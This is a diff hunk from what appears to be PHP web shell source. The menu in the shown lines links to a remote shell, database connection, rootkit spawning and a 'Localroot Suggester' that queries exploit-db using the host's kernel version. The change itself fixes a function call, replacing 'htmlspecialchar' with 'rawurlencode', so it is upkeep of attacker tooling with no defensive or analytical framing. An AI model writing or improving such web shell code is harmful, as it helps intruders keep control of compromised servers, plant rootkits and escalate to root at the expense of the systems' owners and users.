@@ -2261,7 +2261,7 @@ if($s_auth){
 		<td><a href='<?php echo $s_self; ?>x=rs' title='Remote Shell' onclick='return false;'><div class='menumi'>Remote</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=db' title='Connect to database' onclick='return false;'><div class='menumi'>Connect</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=rootkit' title='Spawn Rootkit' onclick='return false;'><div class='menumi'>Spawn</div></a></td>
-		<td><a href='//www.exploit-db.com/search?q=Linux%20Kernel%20<?php echo htmlspecialchar(suggest_exploit());?>' title='Localroot Suggester' onclick='return false;'><div class='menumi'>Localroot Suggester</div></a></td>
+		<td><a href='//www.exploit-db.com/search?q=Linux%20Kernel%20<?php echo rawurlencode(suggest_exploit());?>' title='Localroot Suggester' onclick='return false;'><div class='menumi'>Localroot Suggester</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=about' title='About Of Shell' onclick='return false;'><div class='menumi'>About</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=logout' title='Logout' onclick='return false;'><div class='menumi'>Logout</div></a></td>
 		</tr>
